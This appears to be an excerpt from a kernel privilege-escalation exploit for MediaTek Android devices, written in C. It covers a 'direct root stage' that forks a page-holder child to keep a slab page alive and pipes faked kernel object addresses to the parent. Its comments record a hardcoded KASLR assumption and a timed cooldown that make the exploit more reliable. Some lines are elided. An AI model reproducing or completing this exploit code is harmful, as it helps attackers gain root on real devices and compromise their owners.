...
#define DIRECT_WRITE_ATTEMPTS 1
...
static int run_direct_root_stage(void) {
  ...
  /* ── FUSION: fork a page-holder child to prepare the kernel page ONCE.
   * The child keeps all memfds open (blocked on pause) so the slab page
   * stays alive.  Parent reads kernel addresses via pipe and sets
   * page_reuse_active.  Write children inherit the addresses and skip
   * the 543-clone preparation (~2700 clones → ~543). ── */
  {
    int fusion_pipe[2];
    if (pipe(fusion_pipe) == 0) {
      fusion_holder = fork();
      if (fusion_holder == 0) {
        /* ── page-holder child ── */
        close(fusion_pipe[0]);
        ...
        if (!page_base || !fake_lock || !fake_w0 || !fake_task) {
          uint64_t fail = 0;
          ssize_t w = write(fusion_pipe[1], &fail, sizeof(fail));
          (void)w;
          close(fusion_pipe[1]);
          _exit(1);
        }
        uint64_t addrs[4] = {page_base, fake_lock, fake_w0, fake_task};
        ssize_t w = write(fusion_pipe[1], addrs, sizeof(addrs));
        (void)w;
        close(fusion_pipe[1]);
        /* Block until parent kills us — keeps memfds alive */
        while (1) pause();
        _exit(0);
      }
      close(fusion_pipe[1]);
      if (fusion_holder < 0) {
        ...
        fusion_holder = -1;
        page_reuse_active = 0;
        pr_warning("direct-fusion: fork failed, per-write prepare\n");
      } else {
        uint64_t addrs[4] = {0, 0, 0, 0};
        ssize_t n = read(fusion_pipe[0], addrs, sizeof(addrs));
        close(fusion_pipe[0]);
        if (n == (ssize_t)sizeof(addrs) && addrs[0] != 0) {
          page_base = addrs[0];
          fake_lock = addrs[1];
          fake_w0 = addrs[2];
          fake_task = addrs[3];
          page_reuse_active = 1;
          pr_success("direct-fusion: holder pid=%d page OK base=%016zx "
                     "lock=%016zx w0=%016zx task=%016zx reuse=1\n",
                     fusion_holder, page_base, fake_lock, fake_w0, fake_task);
        } else {
          kill(fusion_holder, SIGKILL);
          waitpid(fusion_holder, NULL, 0);
          fusion_holder = -1;
          page_reuse_active = 0;
          pr_warning("direct-fusion: holder prepare failed, "
                     "per-write prepare mode\n");
        }
      }
    } else {
      fusion_holder = -1;
      page_reuse_active = 0;
      pr_warning("direct-fusion: pipe failed, per-write prepare\n");
    }
  }
  fflush(stdout);
  ...
  if (fusion_holder > 0) {
    kill(fusion_holder, SIGKILL);
    waitpid(fusion_holder, NULL, 0);
    pr_success("direct-fusion: holder pid=%d reaped, all writes complete\n",
               fusion_holder);
  }
...
int run_exploit(int argc, char **argv) {
  ...
  /*
   * MTK KASLR=0: hardcoded (proven across v20-v30, 50+ tests).
   * No warmup needed — v-series proved KASLR=0 is stable without it,
   * and warmup only adds slab pressure for zero benefit.
   */
  ...
  /* v-series proven: 5s cooldown before main stage prevents slab collision */
  pr_info("MTK cooldown before direct stage... sleeping 5s\n");
  fflush(stdout);
  sleep(5);
